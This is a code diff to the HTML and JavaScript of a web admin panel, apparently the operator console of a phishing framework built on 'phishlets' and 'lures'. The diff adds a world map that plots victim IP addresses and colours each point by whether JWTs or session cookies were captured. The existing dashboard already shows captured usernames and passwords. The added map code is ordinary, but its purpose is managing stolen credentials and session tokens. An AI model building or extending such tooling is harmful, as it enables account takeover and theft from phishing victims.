@@ -10,6 +10,7 @@
 <link rel="apple-touch-icon" href="/static/apple-touch-icon.png?v=4">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.css">
 <link href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -62,7 +63,27 @@ a{color:var(--cyan);text-decoration:none}
 .dash-charts{display:grid;grid-template-columns:minmax(0,2fr) minmax(0,1fr);gap:20px;margin-bottom:20px;width:100%;max-width:100%}
 .dash-charts > *{min-width:0;overflow:hidden;background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px}
 .dash-charts canvas{max-width:100% !important}
+.dash-map-card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:20px;min-width:0}
+.dash-map-card .sec-title{margin-bottom:12px}
+#dashMap{height:420px;width:100%;border-radius:10px;background:#0b0e17;border:1px solid var(--border);overflow:hidden}
+.maplibregl-map{font-family:var(--font)}
+.maplibregl-ctrl-group{background:var(--bg2)!important;border:1px solid var(--border)!important;box-shadow:none!important}
+.maplibregl-ctrl-group button{background:var(--bg2)!important;width:30px;height:30px}
+.maplibregl-ctrl-group button+button{border-top:1px solid var(--border)!important}
+.maplibregl-ctrl-group button.dash-z-reset{color:var(--cyan)}
+.maplibregl-ctrl-group button.dash-z-reset i{filter:none;font-size:13px;line-height:1}
+.maplibregl-ctrl button span{filter:invert(1) sepia(1) saturate(5) hue-rotate(90deg)}
+.maplibregl-ctrl-attrib,.maplibregl-ctrl-logo{display:none!important}
+.maplibregl-popup-content{background:var(--bg2);color:#fff;border:1px solid var(--border);border-radius:10px;padding:12px 14px;box-shadow:0 8px 24px rgba(0,0,0,.45)}
+.maplibregl-popup-tip{border-top-color:var(--bg2)!important}
+.maplibregl-popup-close-button{color:#fff;font-size:16px;padding:4px 8px}
+.dash-pop b{color:var(--accent);font-family:var(--mono);font-size:13px}
+.dash-pop .meta{color:var(--text3);font-size:12px;margin-top:4px}
+.dash-dot{display:flex;align-items:center;justify-content:center;width:12px;height:12px;border-radius:50%;border:2px solid rgba(10,14,23,.65);cursor:pointer}
+.dash-dot.n{width:22px;height:22px;font-size:10px;font-weight:800;color:#04110a;font-family:var(--mono)}
+#dashMapUnknown{font-size:12px;color:var(--text3);margin-top:8px;min-height:16px}
 @media(max-width:1100px){.dash-charts{grid-template-columns:1fr}}
+@media(max-width:768px){ #dashMap{height:260px}}
 @keyframes pageIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,180px),1fr));gap:16px;margin-bottom:28px}
 .card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;position:relative;overflow:hidden;transition:border-color 0.3s,transform 0.2s}
@@ -556,6 +577,17 @@ tr:hover td{background:var(--accent-dim)}
     <div class="card"><div class="card-icon orange"><i class="fa-solid fa-key"></i></div><div class="card-val" id="dJwt">0</div><div class="card-label">JWT Captured</div></div>
     <div class="card"><div class="card-icon purple"><i class="fa-solid fa-clock"></i></div><div class="card-val" id="dUptime">—</div><div class="card-label">Server Uptime</div></div>
   </div>
+  <div class="dash-map-card">
+    <div class="sec-title"><i class="fa-solid fa-globe"></i> Session Map</div>
+    <div class="filter-row" id="dashMapFilters">
+      <button class="btn fill sessFilter active" data-filter="all" onclick="filterDashMap('all',this)">ALL <span class="filt-n" data-cnt="all"></span></button>
+      <button class="btn sessFilter" data-filter="jwt" onclick="filterDashMap('jwt',this)"><i class="fa-solid fa-key"></i> WITH JWT <span class="filt-n" data-cnt="jwt"></span></button>
+      <button class="btn sessFilter" data-filter="tokens" onclick="filterDashMap('tokens',this)"><i class="fa-solid fa-cookie-bite"></i> WITH TOKENS <span class="filt-n" data-cnt="tokens"></span></button>
+      <button class="btn sessFilter" data-filter="empty" onclick="filterDashMap('empty',this)"><i class="fa-solid fa-ban"></i> EMPTY <span class="filt-n" data-cnt="empty"></span></button>
+    </div>
+    <div id="dashMap"></div>
+    <div id="dashMapUnknown"></div>
+  </div>
   <div class="dash-charts">
     <div>
       <div class="sec-title" style="margin-bottom:12px"><i class="fa-solid fa-chart-area"></i> Sessions Timeline <span style="font-size:12px;color:var(--text3);font-weight:400;margin-left:8px">(last 7 days)</span></div>
@@ -811,6 +843,7 @@ tr:hover td{background:var(--accent-dim)}
 <div class="modal-overlay" id="modalOverlay"><div class="modal"><div class="modal-head"><h3 id="modalTitle">MODAL</h3><button class="close" onclick="closeModal()">&times;</button></div><div id="modalBody"></div><div class="modal-foot" id="modalFoot"></div></div></div>
 <div class="toast-container" id="toasts"></div>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+<script src="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.js"></script>
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
@@ -875,6 +908,136 @@ function labelTable(tbody){
 function bindCardTables(){document.querySelectorAll('.tbl-wrap tbody').forEach(labelTable)}
 $$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();stopHealth();if(pg!=='proxy')stopProxyIdleRefresh();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='proxy')loadProxy();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions'){resetSessSearch();loadSessions();}if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal();if(pg==='shell')initShell();if(pg==='health')startHealth()})});
 let chartTL=null,chartBD=null,_pxChartBar=null,_pxChartDonut=null;
+let dashMap=null,dashMapMarkers=[],dashMapPts=[],dashMapFilter='all',dashZoomKey=null;
+const DASH_Z={world:1.7,country:4.3,district:8.6,street:15};
+function dashNextZoom(z){
+  if(z<DASH_Z.country-0.35) return DASH_Z.country;
+  if(z<DASH_Z.district-0.35) return DASH_Z.district;
+  return DASH_Z.street;
+}
+function dashPrevZoom(z){
+  if(z>DASH_Z.street-0.7) return DASH_Z.district;
+  if(z>DASH_Z.district-0.7) return DASH_Z.country;
+  return DASH_Z.world;
+}
+function dashFly(lon,lat,z){
+  if(!dashMap)return;
+  dashMap.flyTo({center:[lon,lat],zoom:z,duration:750,essential:true});
+}
+function dashClickPoint(lon,lat,key){
+  const cur=dashMap.getZoom();
+  let z;
+  if(dashZoomKey!==key){dashZoomKey=key;z=(cur>=DASH_Z.country-0.3)?dashNextZoom(cur):DASH_Z.country}
+  else z=dashNextZoom(cur);
+  dashFly(lon,lat,z);
+}
+function dashMapColor(p){if((p.jwt||0)>0)return'#a78bfa';if((p.tokens||0)>0)return'#00ff88';return'#ef4444'}
+function dashMapPass(p){
+  if(dashMapFilter==='jwt')return (p.jwt||0)>0;
+  if(dashMapFilter==='tokens')return (p.tokens||0)>0;
+  if(dashMapFilter==='empty')return (p.empty||0)>0;
+  return true;
+}
+function filterDashMap(f,el){
+  dashMapFilter=f;
+  $$('#dashMapFilters .sessFilter').forEach(b=>{b.classList.remove('active','fill')});
+  if(el){el.classList.add('active','fill')}
+  renderDashMarkers();
+}
+function paintDashStyle(st){
+  const land='#121827', sea='#0b0e17', line='#0b0e17';
+  (st.layers||[]).forEach(l=>{
+    const id=l.id||'', p=l.paint=l.paint||{};
+    if(l.type==='background') p['background-color']=land;
+    if(id==='water'||id.indexOf('landcover_ice')===0||id.indexOf('landcover_glacier')===0){
+      if(p['fill-color']!==undefined) p['fill-color']=id==='water'?sea:land;
+    }
+    if(id==='water'&&l.type==='fill') p['fill-color']=sea;
+    if(id==='waterway'){p['line-color']=sea}
+    if(id.indexOf('boundary')===0){
+      p['line-color']=line;
+      p['line-opacity']=1;
+      p['line-blur']=0;
+      p['line-width']=['interpolate',['linear'],['zoom'],1,0.7,4,1.2,8,1.8,14,2.4];
+    }
+    if(/^(highway|road_|railway|aeroway)/.test(id)&&l.type==='line'){
+      p['line-color']=line;
+      if(p['line-opacity']!==undefined) p['line-opacity']=1;
+    }
+    if(id==='building'){p['fill-color']='#1a2332';p['fill-outline-color']=line}
+    if(l.type==='symbol'){
+      p['text-color']='#ffffff';
+      p['text-halo-color']='rgba(11,14,23,0.92)';
+      p['text-halo-width']=1.2;
+      const ly=l.layout=l.layout||{};
+      if(ly['text-field']!==undefined && id.indexOf('highway_name_motorway')===-1){
+        ly['text-field']=['coalesce',['get','name_en'],['get','name:en'],['get','name:latin'],['get','name']];
+      }
+    }
+  });
+  return st;
+}
+async function ensureDashMap(){
+  const el=document.getElementById('dashMap');
+  if(!el||typeof maplibregl==='undefined')return;
+  if(dashMap){setTimeout(()=>{try{dashMap.resize()}catch(e){}},80);return}
+  let st;
+  try{st=await fetch('https://tiles.openfreemap.org/styles/dark').then(r=>r.json())}
+  catch(e){st={version:8,sources:{},layers:[{id:'background',type:'background',paint:{'background-color':'#121827'}}]}}
+  paintDashStyle(st);
+  dashMap=new maplibregl.Map({container:el,style:st,center:[20,30],zoom:DASH_Z.world,minZoom:1,maxZoom:16,doubleClickZoom:false,attributionControl:false});
+  window.__dashMap=dashMap;
+  const zbox=document.createElement('div');
+  zbox.className='maplibregl-ctrl maplibregl-ctrl-group';
+  zbox.innerHTML='<button type="button" class="maplibregl-ctrl-zoom-in" title="Zoom in" aria-label="Zoom in"><span class="maplibregl-ctrl-icon"></span></button><button type="button" class="maplibregl-ctrl-zoom-out" title="Zoom out" aria-label="Zoom out"><span class="maplibregl-ctrl-icon"></span></button><button type="button" class="dash-z-reset" title="Reset" aria-label="Reset"><i class="fa-solid fa-globe"></i></button>';
+  const zbtns=zbox.querySelectorAll('button');
+  zbtns[0].onclick=()=>{const c=dashMap.getCenter();dashFly(c.lng,c.lat,dashNextZoom(dashMap.getZoom()))};
+  zbtns[1].onclick=()=>{const c=dashMap.getCenter();dashFly(c.lng,c.lat,dashPrevZoom(dashMap.getZoom()))};
+  zbtns[2].onclick=()=>{dashZoomKey=null;dashFly(20,30,DASH_Z.world)};
+  dashMap.addControl({onAdd:()=>zbox,onRemove:()=>{}},'top-left');
+  await new Promise(res=>{
+    if(dashMap.loaded()) res();
+    else dashMap.once('load', res);
+    setTimeout(res, 4000);
+  });
+  try{dashMap.resize()}catch(e){}
+}
+function renderDashMarkers(){
+  if(!dashMap||typeof dashMap.isStyleLoaded==='function'&&!dashMap.isStyleLoaded())return;
+  dashMapMarkers.forEach(m=>{try{m.remove()}catch(e){}});
+  dashMapMarkers=[];
+  dashMapPts.filter(dashMapPass).forEach(p=>{
+    if(p.lat==null||p.lon==null)return;
+    const col=dashMapColor(p);
+    const n=p.n||1;
+    const big=n>1;
+    const node=document.createElement('div');
+    node.className='dash-dot'+(big?' n':'');
+    node.style.background=col;
+    node.style.color=col;
+    if(big) node.textContent=n;
+    const where=[p.city,p.cc].filter(Boolean).join(', ')||'—';
+    const html=`<div class="dash-pop"><b>${esc(p.ip)}</b><div class="meta">${esc(where)}</div><div class="meta">JWT ${p.jwt||0} · Tokens ${p.tokens||0} · Empty ${p.empty||0}</div></div>`;
+    const key=p.ip|| (p.lat+','+p.lon);
+    node.addEventListener('click',ev=>{ev.stopPropagation();dashClickPoint(p.lon,p.lat,key)});
+    const m=new maplibregl.Marker({element:node,anchor:'center'}).setLngLat([p.lon,p.lat]).setPopup(new maplibregl.Popup({offset:14,closeButton:true}).setHTML(html)).addTo(dashMap);
+    dashMapMarkers.push(m);
+  });
+}
+async function loadDashMap(){
+  try{
+    const d=await api('/api/dashboard/map');
+    if(!d||d.error)return;
+    dashMapPts=d.points||[];
+    const c=d.counts||{};
+    const set=(k,v)=>{const n=document.querySelector('#dashMapFilters [data-cnt="'+k+'"]');if(n)n.textContent=v==null?'':v};
+    set('all',c.all||0);set('jwt',c.jwt||0);set('tokens',c.tokens||0);set('empty',c.empty||0);
+    const unk=document.getElementById('dashMapUnknown');
+    if(unk) unk.textContent=d.unknown?(d.unknown+' IPs without coordinates'):'';
+    await ensureDashMap();
+    renderDashMarkers();
+  }catch(e){}
+}
 function renderCharts(d){
   const tl=d.chart_timeline||{labels:[],total:[],jwt:[],cookies:[],empty:[]};
   const bd=d.chart_breakdown||{jwt:0,with_cookies:0,empty:0};
@@ -890,7 +1053,7 @@ function renderCharts(d){
   const leg=document.getElementById('breakdownLegend');
   if(leg){const items=[{label:'JWT Captured',val:bd.jwt,color:'#a78bfa'},{label:'With Cookies',val:bd.with_cookies,color:'#22d3ee'},{label:'Empty',val:bd.empty,color:'#475569'}];leg.innerHTML=items.map(i=>{const pct=bdTotal?((i.val/bdTotal)*100).toFixed(1):'0';return `<div style="display:flex;align-items:center;gap:10px"><div style="width:10px;height:10px;border-radius:50%;background:${i.color};flex-shrink:0"></div><span style="flex:1;font-size:13px;color:var(--text2)">${i.label}</span><span style="font-family:var(--mono);font-size:13px;color:var(--text);font-weight:600">${i.val}</span><span style="font-size:12px;color:var(--text3)">${pct}%</span></div>`}).join('')}
 }
-async function loadDashboard(){const d=await api('/api/dashboard');$('#dPhishlets').textContent=d.active_phishlets;$('#dSessions').textContent=d.total_sessions;$('#dJwt').textContent=d.jwt_sessions;$('#dUptime').textContent=uptime(d.uptime);$('#topDomain').textContent=d.domain||'\u2014';$('#topIp').textContent=d.ipv4||'\u2014';updateEvStatus(d.ev_running);renderCharts(d);let jhtml='';(d.recent_jwt||[]).forEach(s=>{jhtml+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${esc(s.username||'—')}</td><td>${esc(s.password||'—')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!jhtml)jhtml='<tr><td colspan="6" style="text-align:center;color:var(--text3)">No JWT sessions yet</td></tr>';$('#recentJwtBody').innerHTML=jhtml}
+async function loadDashboard(){const d=await api('/api/dashboard');$('#dPhishlets').textContent=d.active_phishlets;$('#dSessions').textContent=d.total_sessions;$('#dJwt').textContent=d.jwt_sessions;$('#dUptime').textContent=uptime(d.uptime);$('#topDomain').textContent=d.domain||'\u2014';$('#topIp').textContent=d.ipv4||'\u2014';updateEvStatus(d.ev_running);renderCharts(d);let jhtml='';(d.recent_jwt||[]).forEach(s=>{jhtml+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${esc(s.username||'—')}</td><td>${esc(s.password||'—')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!jhtml)jhtml='<tr><td colspan="6" style="text-align:center;color:var(--text3)">No JWT sessions yet</td></tr>';$('#recentJwtBody').innerHTML=jhtml;loadDashMap()}
 let healthTimer=null,healthChart=null,healthHist={labels:[],cpu:[],ram:[],netin:[],netout:[]};
 function stopHealth(){if(healthTimer){clearInterval(healthTimer);healthTimer=null}}
 function startHealth(){stopHealth();loadHealth();healthTimer=setInterval(loadHealth,2000)}
